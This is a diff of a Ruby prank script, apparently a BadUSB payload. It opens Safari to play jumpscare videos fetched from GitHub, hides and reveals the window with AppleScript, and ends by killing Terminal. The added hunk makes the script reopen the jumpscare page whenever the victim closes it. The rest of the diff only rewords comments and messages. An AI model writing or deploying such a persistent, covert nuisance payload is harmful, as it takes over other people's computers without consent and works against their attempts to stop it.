@@ -82,14 +82,14 @@ def persistent_jumpscare(video_url)
     system("open -a Safari '#{html_file}'")
     # Immediately hide Safari's front window.
     system("osascript -e 'tell application \"Safari\" to set visible of front window to false'")
-    # Wait 0.75 seconds (0.5 + 0.25 extra).
+    # Wait 0.75 seconds (0.5 + extra 0.25 seconds).
     sleep 0.75
     # Unhide Safari so the jumpscare becomes visible.
     system("osascript -e 'tell application \"Safari\" to set visible of front window to true'")
     # Let the jumpscare play for 1 second.
     sleep 1
 
-    # Check if any Safari tab still has "jumpscare" in its URL.
+    # Check if any Safari tab's URL contains "jumpscare".
     check_script = %Q{
       tell application "Safari"
         set found to false
@@ -102,6 +102,10 @@ def persistent_jumpscare(video_url)
       end tell
     }
     result = `osascript -e '#{check_script}'`.strip.downcase
+    # If not found, force reopen the jumpscare page.
+    unless result.include?("true")
+      system("open -a Safari '#{html_file}'")
+    end
     sleep 3
   end
 end
@@ -138,7 +142,7 @@ else
   elsif first_choice == "tuah"
     persistent_jumpscare("https://raw.githubusercontent.com/Hrampell/badusb_v2/main/Jeff_Jumpscare.mp4")
   elsif first_choice == "next"
-    # Show a second prompt with two buttons: "Sydney lover" and "Slay"
+    # Second prompt with two buttons: "Sydney lover" and "Slay"
     second_choice = display_dialog("Choose a button:", ["Sydney lover", "Slay"], "Sydney lover")
     if second_choice.nil?
       puts "No button chosen. Exiting."
@@ -150,10 +154,10 @@ else
     elsif second_choice == "slay"
       persistent_jumpscare("https://raw.githubusercontent.com/Hrampell/badusb_v2/main/momojumpscare.mp4")
     else
-      puts "Unexpected button choice in second prompt: #{second_choice}"
+      puts "Unexpected button choice: #{second_choice}"
     end
   else
-    puts "Unexpected button choice in first prompt: #{first_choice}"
+    puts "Unexpected button choice: #{first_choice}"
   end
   system("killall Terminal")
   exit 0
